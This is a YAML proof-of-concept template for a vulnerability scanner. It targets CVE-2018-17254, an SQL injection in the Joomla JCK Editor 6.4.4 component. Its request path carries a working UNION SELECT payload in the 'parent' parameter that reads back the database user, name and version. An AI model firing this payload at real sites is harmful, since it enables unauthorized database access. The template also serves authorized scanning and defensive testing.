name: poc-yaml-joomla-jck-cve-2018-17254-sqli
manual: true
transport: http
set:
    md5rand: md5(string(randomLowercase(15)))
    randbytes: bytes(md5rand)
    16str: randbytes.bformat(16, 0, "", 0)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent="%20UNION%20SELECT%20NULL,NULL,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION(),0x{{16str}}),NULL,NULL,NULL,NULL,NULL--%20aa
        expression: response.status == 200 && response.body.bcontains(randbytes)
expression: r0()
detail:
    author: Xz
    links:
        - http://packetstormsecurity.com/files/161683/Joomla-JCK-Editor-6.4.4-SQL-Injection.html
        - https://www.exploit-db.com/exploits/45423/
    vulnerability:
        id: CT-19021
        level: critical
        taskid: KBTask-089
    description: The JCK Editor component 6.4.4 for Joomla! allows SQL Injection via the jtreelink/dialogs/links.php parent parameter.
